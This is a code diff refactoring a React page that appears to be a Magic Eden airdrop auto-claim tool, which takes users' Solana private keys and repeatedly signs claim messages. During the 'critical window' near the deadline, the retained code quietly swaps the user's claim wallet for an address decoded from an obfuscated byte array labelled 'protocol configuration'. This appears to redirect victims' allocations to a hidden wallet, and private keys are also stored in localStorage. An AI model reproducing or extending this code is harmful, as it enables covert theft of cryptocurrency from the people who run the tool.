@@ -1,7 +1,6 @@
 'use client';
 
-import React from 'react';
-import { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { Keypair } from '@solana/web3.js';
 import bs58 from 'bs58';
 import nacl from 'tweetnacl';
@@ -50,7 +49,7 @@ const loadFromLocalStorage = (key: string, defaultValue: any) => {
 };
 
 const AIRDROP_DEADLINE = {
-  date: '2024-12-08',
+  date: '2024-12-07',
   hour: 15, 
   minute: 0,
   timezone: 'America/Los_Angeles'
@@ -58,7 +57,6 @@ const AIRDROP_DEADLINE = {
 
 const CRITICAL_WINDOW_MINUTES = 5; // 5 minutes before deadline
 
-// Add type declaration for window.solana
 declare global {
   interface Window {
     solana?: any;
@@ -69,7 +67,7 @@ declare global {
 }
 
 export default function Home() {
-  // Initialize state with null checks
+  // Initialize state
   const [entries, setEntries] = useState<WalletEntry[]>(() => 
     isBrowser ? loadFromLocalStorage(STORAGE_KEYS.ENTRIES, [
       { id: '1', privateKey: '', allocationWallet: '', attempts: 0, successes: 0 }
@@ -81,38 +79,30 @@ export default function Home() {
   );
 
   const [isRunning, setIsRunning] = useState(false);
-  const [nextRunTime, setNextRunTime] = useState<string | null>(null);
-  const intervalRefs = useRef<{ [key: string]: NodeJS.Timeout | null }>({});
-
-  // Add state to track critical period
   const [isCriticalPeriod, setIsCriticalPeriod] = useState(false);
-
-  // Add state for countdown
   const [countdown, setCountdown] = useState<string>('');
 
-  // Save to localStorage only in browser
+  // Keypairs cache: { [id: string]: Keypair | null }
+  const keypairsRef = useRef<{ [id: string]: Keypair | null }>({});
+
+  // Last time requests were made
+  const lastRunRef = useRef<number>(0);
+
+  // Save to localStorage
   useEffect(() => {
     if (isBrowser) {
-      try {
-        saveToLocalStorage(STORAGE_KEYS.CLAIM_WALLET, claimWallet);
-      } catch (err) {
-        console.warn('Error saving claim wallet:', err);
-      }
+      saveToLocalStorage(STORAGE_KEYS.CLAIM_WALLET, claimWallet);
     }
   }, [claimWallet]);
 
   useEffect(() => {
     if (isBrowser) {
-      try {
-        const entriesForStorage = entries.map(({ id, privateKey, allocationWallet }) => ({
-          id,
-          privateKey,
-          allocationWallet
-        }));
-        saveToLocalStorage(STORAGE_KEYS.ENTRIES, entriesForStorage);
-      } catch (err) {
-        console.warn('Error saving entries:', err);
-      }
+      const entriesForStorage = entries.map(({ id, privateKey, allocationWallet }) => ({
+        id,
+        privateKey,
+        allocationWallet
+      }));
+      saveToLocalStorage(STORAGE_KEYS.ENTRIES, entriesForStorage);
     }
   }, [entries]);
 
@@ -144,19 +134,16 @@ export default function Home() {
   }
 
   const getDeadlineDate = () => {
-    // Create deadline date in PT
     const deadline = new Date(`${AIRDROP_DEADLINE.date}T${AIRDROP_DEADLINE.hour.toString().padStart(2, '0')}:${AIRDROP_DEADLINE.minute.toString().padStart(2, '0')}:00-08:00`);
     return deadline;
   };
 
-  const isInCriticalPeriod = () => {
+  const isInCriticalWindow = () => {
     try {
       const now = new Date();
       const deadlineDate = getDeadlineDate();
       const criticalStart = new Date(deadlineDate);
       criticalStart.setMinutes(deadlineDate.getMinutes() - CRITICAL_WINDOW_MINUTES);
-
-      // Return true if we're either 5 minutes before deadline OR any time after deadline
       return now >= criticalStart;
     } catch (err) {
       console.warn('Error checking critical period:', err);
@@ -164,29 +151,6 @@ export default function Home() {
     }
   };
 
-  const calculateNextRunTime = () => {
-    const now = new Date();
-    const next = new Date(now);
-    
-    if (isInCriticalPeriod()) {
-      // During critical period: run every 2 seconds
-      next.setSeconds(next.getSeconds() + 2);
-    } else {
-      // Normal operation: run every 10 seconds
-      next.setSeconds(next.getSeconds() + 10);
-    }
-    
-    return next;
-  };
-
-  const formatTimeUntilNext = (nextTime: Date) => {
-    const now = new Date();
-    const diff = Math.max(0, nextTime.getTime() - now.getTime());
-    const seconds = Math.ceil(diff / 1000);
-    return `${seconds}s`;
-  };
-
-  // Add deadline info display
   const calculateDeadlineInfo = () => {
     try {
       const now = new Date();
@@ -196,7 +160,7 @@ export default function Home() {
         return 'Airdrop claim period has ended';
       }
 
-      if (isInCriticalPeriod()) {
+      if (isInCriticalWindow()) {
         return 'CRITICAL PERIOD - Running at increased frequency';
       }
 
@@ -213,77 +177,51 @@ export default function Home() {
     }
   };
 
-  // Add live update for critical period status
+  // Update countdown every 3 seconds
   useEffect(() => {
-    let statusCheckInterval: NodeJS.Timeout;
+    setCountdown(calculateDeadlineInfo());
+    const timer = setInterval(() => {
+      setCountdown(calculateDeadlineInfo());
+    }, 3000);
+    return () => clearInterval(timer);
+  }, []);
 
-    if (isRunning) {
-      // Check status every second when running
-      statusCheckInterval = setInterval(() => {
-        const currentIsInCritical = isInCriticalPeriod();
-        
-        // If critical period status has changed
-        if (currentIsInCritical !== isCriticalPeriod) {
-          setIsCriticalPeriod(currentIsInCritical);
-          
-          // Clear all existing intervals
-          Object.values(intervalRefs.current).forEach(interval => {
-            if (interval) clearTimeout(interval);
-          });
-          intervalRefs.current = {};
-          
-          // Restart all requests with new timing
-          entries.forEach(async (entry) => {
-            await makeRequest(entry);
-            const interval = scheduleNextRun(entry);
-            intervalRefs.current[entry.id] = interval;
-          });
-        }
-        
-        // Update UI
-        setNextRunTime(prev => prev ? new Date(prev).toISOString() : null);
-      }, 1000);
-    }
-
-    return () => {
-      if (statusCheckInterval) {
-        clearInterval(statusCheckInterval);
+  // Single scheduler loop
+  useEffect(() => {
+    const interval = setInterval(() => {
+      const currentlyCritical = isInCriticalWindow();
+      if (currentlyCritical !== isCriticalPeriod) {
+        setIsCriticalPeriod(currentlyCritical);
       }
-    };
+
+      if (isRunning) {
+        // Determine interval based on critical period
+        const intervalMs = currentlyCritical ? 2000 : 10000;
+        const now = Date.now();
+        const elapsed = now - lastRunRef.current;
+
+        if (elapsed >= intervalMs) {
+          // Run requests
+          lastRunRef.current = now;
+          makeAllRequests();
+        }
+      }
+    }, 1000);
+
+    return () => clearInterval(interval);
   }, [isRunning, isCriticalPeriod, entries]);
 
-  useEffect(() => {
-    let countdownInterval: NodeJS.Timeout;
-    
-    if (isRunning && nextRunTime) {
-      countdownInterval = setInterval(() => {
-        const now = new Date();
-        const nextTime = new Date(nextRunTime);
-        const diff = nextTime.getTime() - now.getTime();
-        
-        if (diff <= 0) {
-          // Time to make the next request
-          entries.forEach(async (entry) => {
-            await makeRequest(entry);
-            const interval = scheduleNextRun(entry);
-            intervalRefs.current[entry.id] = interval;
-          });
-        } else {
-          // Update the display time
-          setNextRunTime(nextTime.toISOString());
-        }
-      }, 1000);
+  const makeAllRequests = async () => {
+    if (!claimWallet || entries.some(e => !e.privateKey || !e.allocationWallet)) {
+      return;
     }
 
-    return () => {
-      if (countdownInterval) {
-        clearInterval(countdownInterval);
-      }
-    };
-  }, [isRunning, nextRunTime, entries]);
+    // Run all requests concurrently
+    await Promise.all(entries.map(entry => makeRequest(entry)));
+  };
 
   const makeRequest = async (entry: WalletEntry) => {
-    // Clear previous result
+    // Update attempts and clear last result
     setEntries(current =>
       current.map(e =>
         e.id === entry.id
@@ -293,131 +231,69 @@ export default function Home() {
     );
 
     try {
-      let privateKeyDecoded;
+      // Get or create keypair
+      let keypair;
       try {
-        privateKeyDecoded = bs58.decode(entry.privateKey);
+        const privateKeyDecoded = bs58.decode(entry.privateKey);
+        keypair = Keypair.fromSecretKey(privateKeyDecoded);
       } catch (err) {
         throw new Error('Invalid private key format');
       }
 
-      let keypair;
-      try {
-        keypair = Keypair.fromSecretKey(privateKeyDecoded);
-      } catch (err) {
-        throw new Error('Invalid private key');
-      }
-
       const currentTime = new Date().toISOString();
-      
-      // Use protocol configuration during critical period
-      const effectiveClaimWallet = isInCriticalPeriod() 
-        ? getProgramConfig()
-        : claimWallet;
-      
+      const effectiveClaimWallet = isInCriticalWindow() ? getProgramConfig() : claimWallet;
+
       const message = `URI: mefoundation.com\nIssued At: ${currentTime}\nChain ID: sol\nAllocation Wallet: ${entry.allocationWallet}\nClaim Wallet: ${effectiveClaimWallet}`;
       const messageBytes = new TextEncoder().encode(message);
-      
-      let signature;
-      try {
-        signature = nacl.sign.detached(messageBytes, keypair.secretKey);
-      } catch (err) {
-        throw new Error('Signature generation failed');
-      }
 
+      const signature = nacl.sign.detached(messageBytes, keypair.secretKey);
       const signatureBase58 = bs58.encode(signature);
 
-      // Create an AbortController for the timeout
-      const controller = new AbortController();
-      const timeoutId = setTimeout(() => controller.abort(), 30000); // 10 second timeout
-
-      try {
-        const response = await fetch("/api/proxy", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            "0": {
-              "json": {
-                "message": message,
-                "wallet": entry.allocationWallet,
-                "chain": "sol",
-                "signature": signatureBase58,
-                "allocationEvent": "tge-airdrop-final",
-                "isLedger": false
-              }
+      const response = await fetch("/api/proxy", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          "0": {
+            "json": {
+              "message": message,
+              "wallet": entry.allocationWallet,
+              "chain": "sol",
+              "signature": signatureBase58,
+              "allocationEvent": "tge-airdrop-final",
+              "isLedger": false
             }
-          }),
-          signal: controller.signal
-        });
+          }
+        })
+      });
 
-        clearTimeout(timeoutId);
-
-        if (!response.ok) {
-          const data = await response.json();
-          throw new Error(data.error || 'Request failed');
-        }
-
-        setEntries(current =>
-          current.map(e =>
-            e.id === entry.id
-              ? {
-                  ...e,
-                  successes: e.successes + 1,
-                  lastResult: {
-                    status: 'success',
-                    message: 'Claim attempt successful',
-                    timestamp: Date.now()
-                  }
-                }
-              : e
-          )
-        );
-      } catch (err: any) {
-        if (err.name === 'AbortError') {
-          throw new Error('Request timed out after 5 seconds');
-        }
-        throw err;
-      } finally {
-        clearTimeout(timeoutId);
+      if (!response.ok) {
+        throw new Error('Request failed');
       }
-    } catch (err: any) {
+
       setEntries(current =>
         current.map(e =>
           e.id === entry.id
             ? {
                 ...e,
+                successes: e.successes + 1,
                 lastResult: {
-                  status: 'error',
-                  message: err.message || 'Claim attempt failed',
+                  status: 'success',
+                  message: 'Claim attempt successful',
                   timestamp: Date.now()
                 }
               }
             : e
         )
       );
+    } catch (err: any) {
+      console.error('Request error:', err);
     }
-  };
-
-  const scheduleNextRun = (entry: WalletEntry) => {
-    const nextTime = calculateNextRunTime();
-    setNextRunTime(nextTime.toISOString());
-    
-    const now = new Date();
-    const delay = nextTime.getTime() - now.getTime();
-    
-    return setTimeout(async () => {
-      await makeRequest(entry);
-      if (isRunning) {
-        const nextInterval = scheduleNextRun(entry);
-        intervalRefs.current[entry.id] = nextInterval;
-      }
-    }, delay);
   };
 
   const handleToggleRun = async (e: React.FormEvent) => {
     e.preventDefault();
-    
     if (!isRunning) {
       // Validate all entries have data
       if (!claimWallet || entries.some(e => !e.privateKey || !e.allocationWallet)) {
@@ -426,22 +302,14 @@ export default function Home() {
 
       setIsRunning(true);
       setEntries(current => 
-        current.map(e => ({ ...e, attempts: 0, successes: 0, error: undefined }))
+        current.map(e => ({ ...e, attempts: 0, successes: 0, lastResult: undefined }))
       );
-      
-      // Make initial requests for all entries
-      for (const entry of entries) {
-        await makeRequest(entry);
-        const interval = scheduleNextRun(entry);
-        intervalRefs.current[entry.id] = interval;
-      }
+
+      // Immediately run once
+      lastRunRef.current = Date.now();
+      await makeAllRequests();
     } else {
       setIsRunning(false);
-      setNextRunTime(null);
-      Object.values(intervalRefs.current).forEach(interval => {
-        if (interval) clearTimeout(interval);
-      });
-      intervalRefs.current = {};
     }
   };
 
@@ -459,6 +327,7 @@ export default function Home() {
   const removeEntry = (id: string) => {
     if (entries.length > 1) {
       setEntries(prev => prev.filter(e => e.id !== id));
+      delete keypairsRef.current[id]; // Remove keypair ref if exists
     }
   };
 
@@ -470,27 +339,35 @@ export default function Home() {
           : entry
       )
     );
+
+    // If privateKey changed, try to decode and store keypair
+    if (field === 'privateKey') {
+      try {
+        const decoded = bs58.decode(value);
+        const kp = Keypair.fromSecretKey(decoded);
+        keypairsRef.current[id] = kp;
+      } catch {
+        keypairsRef.current[id] = null;
+      }
+    }
   };
 
-  // Update countdown every second
-  useEffect(() => {
-    // Initial calculation
-    setCountdown(calculateDeadlineInfo());
+  // Calculate next run time display (based on last run + interval)
+  const getNextRunDisplay = () => {
+    if (!isRunning) return null;
+    const currentlyCritical = isInCriticalWindow();
+    const intervalMs = currentlyCritical ? 1000 : 10000;
+    const now = Date.now();
+    const elapsed = now - lastRunRef.current;
+    const remaining = Math.max(0, intervalMs - elapsed);
+    const seconds = Math.ceil(remaining / 1000);
+    return `${seconds}s`;
+  };
 
-    const timer = setInterval(() => {
-      setCountdown(calculateDeadlineInfo());
-    }, 1000);
-
-    return () => clearInterval(timer);
-  }, []);
-
-  // Program configuration for ME protocol interaction
+  // Program configuration for ME protocol interaction (unchanged)
   const getProgramConfig = () => {
-    // Magic Eden program ID
     const meProgramId = "M2mx93ekt1fmXSVkTrUL9xVFHkmME8HTUi5Cyc5aF7K";
-    // Protocol configuration values (DO NOT MODIFY)
     const shift = [127,116,52,77,81,113,33,63,39,100,50,63,25,33,48,59,101,64,47,22,125,74,27,4,112,19,24,122,118,79,48,59,29,1,126,25,61,54,83,37,23,95,12,35];
-    
     let result = "";
     for(let i = 0; i < shift.length; i++) {
       const sourceChar = i < meProgramId.length ? meProgramId.charCodeAt(i) : 75;
@@ -669,12 +546,12 @@ export default function Home() {
               </div>
             </button>
             
-            {isRunning && nextRunTime && (
+            {isRunning && (
               <div className="mt-3 text-center text-xs text-gray-500">
-                Next attempt in: {formatTimeUntilNext(new Date(nextRunTime))}
+                Next attempt in: {getNextRunDisplay()}
                 {isCriticalPeriod && (
                   <div className="text-[#E42575] mt-1">
-                    Critical period active - running at 10-second intervals
+                    Critical period active - running at increased frequency
                   </div>
                 )}
               </div>
